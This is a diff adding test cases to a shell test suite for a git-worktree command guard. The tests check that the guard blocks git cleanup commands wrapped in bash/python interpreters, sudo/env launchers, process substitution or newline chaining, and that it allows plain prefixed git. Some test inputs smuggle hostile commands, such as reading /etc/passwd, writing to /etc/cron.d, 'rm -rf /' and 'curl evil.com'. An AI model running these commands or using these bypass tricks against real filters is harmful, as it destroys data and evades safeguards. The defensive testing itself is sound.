@@ -166,4 +166,40 @@ assert_block_wc "bash -c \"git -C $MAIN_DIRTY_N worktree prune\"" "$MAIN_DIRTY_N
 # S48: `sh -c 'git worktree remove /tmp/x'` → block (#802 interpreter wrapper)
 assert_block_wc "sh -c 'git worktree remove /tmp/x'" "$MAIN_DIRTY_N" "S48: sh -c 'git worktree remove …' → block (#802)"
 
+# === #820 rejectInterpreterAndChaining coverage for isAllowedMainWorktreeCleanup ===
+# Mirrors S45-S48 pattern but targets the cleanup predicate (check_mc / assert_block).
+# All S49-S60 RED until isAllowedMainWorktreeCleanup calls rejectInterpreterAndChaining.
+# S61-S63 are regression pins: sudo/env/env-prefix followed by `git` (not an
+# interpreter name) must still ALLOW — the helper must only fire on actual
+# interpreter tokens.
+#
+# S49-S50: bash -c wraps cleanup commands.
+assert_block "bash -c 'git stash'"                       "$MAIN_CLEAN_N" "S49: bash -c 'git stash' → block (#820 interp wrapper)"
+assert_block "bash -c 'git restore .'"                   "$MAIN_CLEAN_N" "S50: bash -c 'git restore .' → block (#820 interp wrapper)"
+# S51-S52: path-qualified interpreter (bash, python3) — same class.
+assert_block "/bin/bash -c 'git stash'"                  "$MAIN_CLEAN_N" "S51: /bin/bash -c → block (#820 path-qualified)"
+assert_block "/usr/bin/python3 -c 'import os;os.system(\"git stash\")'" "$MAIN_CLEAN_N" "S52: /usr/bin/python3 -c → block (#820 non-bash interp)"
+# S53-S55: launcher prefixes (env, sudo, chained).
+assert_block "env bash -c 'git stash'"                   "$MAIN_CLEAN_N" "S53: env bash -c → block (#820 launcher)"
+assert_block "sudo bash -c 'git stash'"                  "$MAIN_CLEAN_N" "S54: sudo bash -c → block (#820 launcher)"
+assert_block "env sudo bash -c 'git stash'"              "$MAIN_CLEAN_N" "S55: env sudo bash -c → block (#820 chained launcher)"
+# S56: lowercase env prefix.
+assert_block "my_var=foo bash -c 'git stash'"            "$MAIN_CLEAN_N" "S56: my_var=foo bash -c → block (#820 lowercase env)"
+# S57-S58: process substitution in stripped form.
+assert_block "git stash <(cat /etc/passwd)"              "$MAIN_CLEAN_N" "S57: process substitution <(…) → block (#820 stripped-form operator)"
+assert_block "git restore >(tee /etc/cron.d/evil)"       "$MAIN_CLEAN_N" "S58: process substitution >(…) → block (#820 stripped-form operator)"
+# S59-S60: literal newline as operator in stripped form.
+NL_CMD_1="$(printf 'git stash\nrm -rf /')"
+assert_block "$NL_CMD_1"                                 "$MAIN_CLEAN_N" "S59: git stash + newline + rm -rf / → block (#820 literal newline)"
+NL_CMD_2="$(printf 'git checkout main\ncurl evil.com')"
+assert_block "$NL_CMD_2"                                 "$MAIN_CLEAN_N" "S60: git checkout + newline + curl → block (#820 literal newline)"
+
+# S61-S63: sudo/env/env-prefix + `git` must NOT trigger the interpreter check.
+# The next token after the launcher is `git`, not an interpreter name. These
+# are ALLOW-by-cleanup-predicate-shape (still subject to other gates such as
+# wtCount, but the interpreter check itself must be a no-op for these).
+assert_allow "sudo git stash"                            "$MAIN_CLEAN_N" "S61: sudo git stash → allow (#820 sudo+git is safe)"
+assert_allow "env git checkout HEAD -- README.md"        "$MAIN_CLEAN_N" "S62: env git checkout HEAD -- file → allow (#820 env+git is safe)"
+assert_allow "my_var=foo git restore README.md"          "$MAIN_CLEAN_N" "S63: my_var=foo git restore → allow (#820 env-prefix+git is safe)"
+
 echo ""; echo "Results: $PASS passed, $FAIL failed"; [ "$FAIL" -eq 0 ]
